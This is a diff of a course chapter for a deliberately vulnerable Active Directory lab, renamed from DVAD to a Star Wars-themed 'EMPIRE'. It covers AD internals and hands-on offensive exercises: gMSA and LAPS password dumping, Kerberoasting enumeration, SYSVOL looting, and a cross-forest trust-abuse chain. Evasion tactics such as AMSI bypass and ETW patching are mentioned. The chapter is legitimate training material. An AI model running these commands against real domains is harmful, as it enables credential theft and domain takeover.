+This is `PER-014` in EMPIRE. Detection: 5136 (DS object modified) on AdminSDHolder, plus 4780 (SDProp run, reset DACL on protected account).
 
 ---
 
@@ -777,7 +777,7 @@ Every domain has an account named `krbtgt`. Its password is **the master key to 
 - RID 502.
 - Disabled (`UAC=ACCOUNTDISABLE`, cannot log in interactively).
 - Password rotates only when an admin explicitly runs `Reset-KrbtgtPassword` (or by automation). Many orgs never have.
-- **DVAD sets it to `KrbtgtDVAD2024!`** for deterministic Golden Ticket creation.
+- **EMPIRE sets it to `KrbtgtEmpire2024!`** for deterministic Golden Ticket creation.
 
 To rotate properly you must do it **twice**, with a gap longer than max ticket age (default 10 hours), because Kerberos remembers the *previous* key (`oldUnicodePwd`) to accept tickets issued under the old key while they're in flight.
 
@@ -789,13 +789,13 @@ PS> Get-ADUser krbtgt -Properties pwdLastSet | Select pwdLastSet
 
 ### Read-only Domain Controllers (RODCs)
 
-RODCs have their own krbtgt-equivalent account (`krbtgt_<RODC-id>$`) with a separate key. Selective password replication means a stolen RODC compromises only the passwords replicated to it. They are designed for branch offices with poor physical security. None in DVAD.
+RODCs have their own krbtgt-equivalent account (`krbtgt_<RODC-id>$`) with a separate key. Selective password replication means a stolen RODC compromises only the passwords replicated to it. They are designed for branch offices with poor physical security. None in EMPIRE.
 
 ---
 
 ## 4.18 Machine accounts and gMSAs
 
-Every domain-joined computer has a corresponding machine account in AD: `WS01$`, `DC01$`, `FILE01$`. Suffix `$` distinguishes from user. The password is a 240-character random string rotated by the host every 30 days (`MaximumPasswordAge` for computer secret defaults). The NT hash and AES keys are used for Kerberos service ticket encryption against the host's services.
+Every domain-joined computer has a corresponding machine account in AD: `tatooine$`, `coruscant$`, `scarif$`. Suffix `$` distinguishes from user. The password is a 240-character random string rotated by the host every 30 days (`MaximumPasswordAge` for computer secret defaults). The NT hash and AES keys are used for Kerberos service ticket encryption against the host's services.
 
 Salt for AES key derivation:
 
@@ -824,10 +824,10 @@ struct {
 };
 ```
 
-DVAD has a gMSA with overly permissive `msDS-GroupMSAMembership` so a regular user can read its blob via `gMSADumper.py`. That's `CRED-024`.
+EMPIRE has a gMSA with overly permissive `msDS-GroupMSAMembership` so a regular user can read its blob via `gMSADumper.py`. That's `CRED-024`.
 
 ```bash
-python3 gMSADumper.py -u peter.parker -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
+python3 gMSADumper.py -u peter.parker -p 'EmpireLab2024!' -d empire.local -l 10.10.0.10
 ```
 
 Output: NT hash of the gMSA's current password — pass-the-hash to wherever the gMSA can log in.
@@ -844,16 +844,16 @@ This single default is the foundation of:
 - **Certifried (CVE-2022-26923).** Create a computer with a `dNSHostName` matching a DC's, request a cert template that maps DNS → user.
 - **Most RBCD exploits.** Need a controllable principal; the throwaway computer is it.
 
-DVAD leaves it at default → `MachineAccountQuota=10` → CRED-019, PER-005, DF-003 all chain through it.
+EMPIRE leaves it at default → `MachineAccountQuota=10` → CRED-019, PER-005, DF-003 all chain through it.
 
 ### How to query and set
 
 ```
-PS> Get-ADObject "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota
-PS> Set-ADObject "DC=corp,DC=local" -Replace @{ "ms-DS-MachineAccountQuota" = 0 }    # the fix
+PS> Get-ADObject "DC=empire,DC=local" -Properties ms-DS-MachineAccountQuota
+PS> Set-ADObject "DC=empire,DC=local" -Replace @{ "ms-DS-MachineAccountQuota" = 0 }    # the fix
 ```
 
-Setting to 0 stops the RBCD chain cold. DVAD does not set it.
+Setting to 0 stops the RBCD chain cold. EMPIRE does not set it.
 
 ---
 
@@ -868,19 +868,19 @@ PS> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
 PS> Restore-ADObject -Identity '<DN>'
 ```
 
-Implication: an attacker who "deletes" your high-value object can be undone — unless they wait 180 days, or they delete the recycle bin's parent containers (which requires forest-admin equivalence). Less relevant for DVAD operationally; recognise the concept.
+Implication: an attacker who "deletes" your high-value object can be undone — unless they wait 180 days, or they delete the recycle bin's parent containers (which requires forest-admin equivalence). Less relevant for EMPIRE operationally; recognise the concept.
 
 ### Replication metadata as forensic trail
 
 `repadmin /showobjmeta` reveals per-attribute version history:
 
 ```
-PS> repadmin /showobjmeta dc01.corp.local "CN=peter.parker,CN=Users,DC=corp,DC=local"
+PS> repadmin /showobjmeta coruscant.empire.local "CN=peter.parker,CN=Users,DC=empire,DC=local"
 
 Loc.USN  Originating DSA       Org.USN  Org.Time/Date       Ver Attribute
 =======  =================     =======  ===================  === =========
-   1234  Default-First-Site\DC01  1234  2026-01-15 09:12     1   objectClass
-   5678  Default-First-Site\DC01  5678  2026-04-01 14:30     5   unicodePwd
+   1234  Default-First-Site\coruscant  1234  2026-01-15 09:12     1   objectClass
+   5678  Default-First-Site\coruscant  5678  2026-04-01 14:30     5   unicodePwd
    ...
 ```
 
@@ -905,7 +905,7 @@ By default (older configurations), LDAP allowed:
 - **LDAP server signing required** (`HKLM\SYSTEM\CCS\Services\NTDS\Parameters\LDAPServerIntegrity=2`) — requires SASL integrity.
 - **LDAP channel binding required** (`LdapEnforceChannelBinding=2`) — binds the LDAPS session to the TLS channel, defeating NTLM relay to LDAPS.
 
-DVAD intentionally leaves these at lower levels (`LDAPServerIntegrity=1`, channel binding not enforced) so that NTLM relay to LDAP succeeds (IA-008 family, ADCS ESC8/ESC11).
+EMPIRE intentionally leaves these at lower levels (`LDAPServerIntegrity=1`, channel binding not enforced) so that NTLM relay to LDAP succeeds (IA-008 family, ADCS ESC8/ESC11).
 
 ---
 
@@ -914,17 +914,17 @@ DVAD intentionally leaves these at lower levels (`LDAPServerIntegrity=1`, channe
 AD relies on DNS for **service location**. The KDC, LDAP, GC, and Kerberos password change services all have SRV records published under reserved names:
 
 ```
-_ldap._tcp.dc._msdcs.corp.local       -> dc01.corp.local:389
-_kerberos._tcp.dc._msdcs.corp.local   -> dc01.corp.local:88
-_kerberos._udp.corp.local             -> dc01.corp.local:88
-_kpasswd._tcp.corp.local              -> dc01.corp.local:464
-_gc._tcp.corp.local                   -> dc01.corp.local:3268
-_ldap._tcp.<sitename>._sites.dc._msdcs.corp.local
+_ldap._tcp.dc._msdcs.empire.local       -> coruscant.empire.local:389
+_kerberos._tcp.dc._msdcs.empire.local   -> coruscant.empire.local:88
+_kerberos._udp.empire.local             -> coruscant.empire.local:88
+_kpasswd._tcp.empire.local              -> coruscant.empire.local:464
+_gc._tcp.empire.local                   -> coruscant.empire.local:3268
+_ldap._tcp.<sitename>._sites.dc._msdcs.empire.local
 ```
 
-`dig SRV _ldap._tcp.dc._msdcs.corp.local @10.10.0.10` from Kali reveals the DC list.
+`dig SRV _ldap._tcp.dc._msdcs.empire.local @10.10.0.10` from Kali reveals the DC list.
 
-Dynamic DNS updates: domain-joined hosts register their own A and PTR records at boot. The DC accepts the update if it has a valid Kerberos ticket. This is the **DNS spoofing** surface: any authenticated user can register arbitrary names (with default ACLs) — that's how mitm6 chains to "wpad.corp.local" hijacking (IA-007).
+Dynamic DNS updates: domain-joined hosts register their own A and PTR records at boot. The DC accepts the update if it has a valid Kerberos ticket. This is the **DNS spoofing** surface: any authenticated user can register arbitrary names (with default ACLs) — that's how mitm6 chains to "wpad.empire.local" hijacking (IA-007).
 
 ### DNS attacks worth knowing
 
@@ -944,40 +944,40 @@ Two generations:
 ACL pattern: only specific principals get **AllExtendedRights** (which includes the ms-Mcs-AdmPwd reading right). A misconfigured ACL → any low-priv user reads the local admin password of any computer.
 
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --laps
 ```
 
-DVAD seeds a misconfigured LAPS ACL on one OU — that's CRED-019.
+EMPIRE seeds a misconfigured LAPS ACL on one OU — that's CRED-019.
 
 ---
 
-## 4.24 Cross-forest paths in DVAD
+## 4.24 Cross-forest paths in EMPIRE
 
 To anchor the next chapters, this is what cross-forest looks like:
 
 ```
-[ peter.parker in corp.local (Domain User) ]
+[ peter.parker in empire.local (Domain User) ]
           |
           | (1) Land via initial access (IA-* family)
           v
-[ peter.parker in corp.local with creds ]
+[ peter.parker in empire.local with creds ]
           |
-          | (2) Privesc to DA in corp.local (PE-*, CRED-007 DCSync)
+          | (2) Privesc to DA in empire.local (PE-*, CRED-007 DCSync)
           v
-[ Domain Admin in corp.local ]
+[ Domain Admin in empire.local ]
           |
-          | (3) Dump trust keys (lsadump::trust on dc01.corp.local)
+          | (3) Dump trust keys (lsadump::trust on coruscant.empire.local)
           v
-[ Have FINANCE\$$$ trust key ]
+[ Have REBEL\$$$ trust key ]
           |
           | (4) Forge inter-realm TGT for corp -> finance with SID history
-          |     Targeting S-1-5-21-FINANCE-519 (Enterprise Admins of finance)
+          |     Targeting S-1-5-21-REBEL-519 (Enterprise Admins of finance)
           v
-[ Enterprise Admin in finance.local ]
+[ Enterprise Admin in rebel.local ]
           |
-          | (5) Repeat for root.corp via the forest trust
+          | (5) Repeat for trade.corp via the forest trust
           v
-[ Enterprise Admin in root.corp ]
+[ Enterprise Admin in trade.corp ]
 ```
 
 Each step is a distinct chapter — chapter 09 for IA, chapter 10 for CRED-007, chapter 11 for PE chains, chapter 12 for the trust-forge and SID-history injection. This chapter (04) sets every term used in the chain.
@@ -991,10 +991,10 @@ Each step is a distinct chapter — chapter 09 for IA, chapter 10 for CRED-007, 
 From your attacker box:
 
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --query '(objectClass=trustedDomain)' '*'
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --query '(objectClass=trustedDomain)' '*'
 ```
 
-You should see trust objects for `eu.corp.local` (parent-child), `finance.local` (external), and `root.corp` (forest).
+You should see trust objects for `eu.empire.local` (parent-child), `rebel.local` (external), and `trade.corp` (forest).
 
 Alternative with the AD module on a victim:
 
@@ -1015,7 +1015,7 @@ Identify the PDC Emulator. Note its IP. That's your ZeroLogon target (CRED-029 /
 ### Exercise 4.C — Inspect AdminSDHolder DACL
 
 ```
-PS> Get-DomainObjectAcl -SearchBase "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs |
+PS> Get-DomainObjectAcl -SearchBase "CN=AdminSDHolder,CN=System,DC=empire,DC=local" -ResolveGUIDs |
        Select-Object IdentityReferenceName, ActiveDirectoryRights, ObjectAceType
 ```
 
@@ -1024,8 +1024,8 @@ Baseline: only built-in admins, SYSTEM, and "SELF" / "BUILTIN" should have anyth
 ### Exercise 4.D — UAC bit query for AS-REP roastable users
 
 ```bash
-ldapsearch -x -H ldap://10.10.0.10 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
-  -b 'DC=corp,DC=local' \
+ldapsearch -x -H ldap://10.10.0.10 -D 'peter.parker@empire.local' -w 'EmpireLab2024!' \
+  -b 'DC=empire,DC=local' \
   '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
   samAccountName
 ```
@@ -1035,7 +1035,7 @@ Expect a small set of intentionally roastable accounts (`svc_legacy`, perhaps `n
 ### Exercise 4.E — Find SPNs
 
 ```bash
-impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-GetUserSPNs empire.local/peter.parker:'EmpireLab2024!' -dc-ip 10.10.0.10
 ```
 
 Gives you the list of kerberoastable users plus their SPNs. Don't crack yet — Chapter 10. Record output for the capstone.
@@ -1043,8 +1043,8 @@ Gives you the list of kerberoastable users plus their SPNs. Don't crack yet — 
 ### Exercise 4.F — Browse SYSVOL
 
 ```bash
-smbclient -U 'peter.parker%DVADlab2024!' //10.10.0.10/SYSVOL
-smb: \> cd corp.local\Policies
+smbclient -U 'peter.parker%EmpireLab2024!' //10.10.0.10/SYSVOL
+smb: \> cd empire.local\Policies
 smb: \> ls
 smb: \> recurse on; prompt off; mget *
 ```
@@ -1069,7 +1069,7 @@ Later (Chapter 12), you'll dump trust keys via `secretsdump --user-status` after
 ### Exercise 4.H — Compute the EA SID of a foreign forest
 
 ```
-PS> $eaSid = (Get-ADGroup "Enterprise Admins" -Server finance.local).SID.Value
+PS> $eaSid = (Get-ADGroup "Enterprise Admins" -Server rebel.local).SID.Value
 PS> $eaSid    # e.g., S-1-5-21-1234567890-1234567890-1234567890-519
 ```
 
@@ -1078,7 +1078,7 @@ You'll need this exact SID for SID history injection in chapter 12 (DF-001 famil
 ### Exercise 4.I — Inspect MachineAccountQuota
 
 ```
-PS> Get-ADObject "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota | Select ms-DS-MachineAccountQuota
+PS> Get-ADObject "DC=empire,DC=local" -Properties ms-DS-MachineAccountQuota | Select ms-DS-MachineAccountQuota
 ```
 
 Confirm it is 10. That's the precondition for everything in §4.12.3.
@@ -1103,7 +1103,7 @@ If the SD includes `Domain Users` or any low-priv group, that's CRED-024 setup.
 5. What does the PDC Emulator FSMO role do, and which two AD attacks target it specifically?
 6. Why is DCSync possible even without admin rights, given the right ACE? Which two GUIDs identify the ACE?
 7. What's the difference between an external trust and a forest trust? Which one supports transitivity?
-8. What does SID filtering do, and why does DVAD disable it?
+8. What does SID filtering do, and why does EMPIRE disable it?
 9. What is an SPN, why does Kerberoasting need one, and how do you abuse a `writeProperty servicePrincipalName` ACE?
 10. What's the difference between constrained delegation with and without protocol transition? Which one is strictly more dangerous to compromise?
 11. What is RBCD and what's the minimum precondition to abuse it? Why does setting `MachineAccountQuota=0` block it entirely?
@@ -1113,7 +1113,7 @@ If the SD includes `Domain Users` or any low-priv group, that's CRED-024 setup.
 15. Why does the PAC matter for ticket forgery? What did KB5020805 change?
 16. Where does ADCS PKI metadata live, and why does `certipy find` work with just Domain User credentials?
 17. What is the Protected Users group, and what hardenings does it enforce on members?
-18. Explain why DVAD's three-forest topology is needed to teach the DF-* attack family.
+18. Explain why EMPIRE's three-forest topology is needed to teach the DF-* attack family.
 
 ---
 
@@ -1126,7 +1126,7 @@ If the SD includes `Domain Users` or any low-priv group, that's CRED-024 setup.
 - **MS-SAMR** — SAM remote protocol.
 - **Microsoft Docs — Active Directory Concepts:** https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/
 - **Microsoft Docs — *Best Practices for Securing Active Directory*** — official hardening guide.
-- **Microsoft Docs — *Five Common Mistakes That Allow Attackers to Compromise AD*** — blog summary of the misconfigs DVAD reproduces.
+- **Microsoft Docs — *Five Common Mistakes That Allow Attackers to Compromise AD*** — blog summary of the misconfigs EMPIRE reproduces.
 - **adsecurity.org** — Sean Metcalf's encyclopedia. Read the AD attack primer pieces; gold standard.
 - **SpecterOps — *An ACE in the Hole*** — overview of ACL-based attacks.
 - **harmj0y — *A Pentester's Guide to Group Scoping*** — corner case but worth knowing.
@@ -1136,3 +1136,85 @@ If the SD includes `Domain Users` or any low-priv group, that's CRED-024 setup.
 - **Black Hat / DEF CON talks** — *DCShadow*, *Golden SAML*, *From Domain Admin to Enterprise Admin*, *Lethal Injection: Forest Trusts*.
 
 Next: [05-authentication-protocols.md](05-authentication-protocols.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
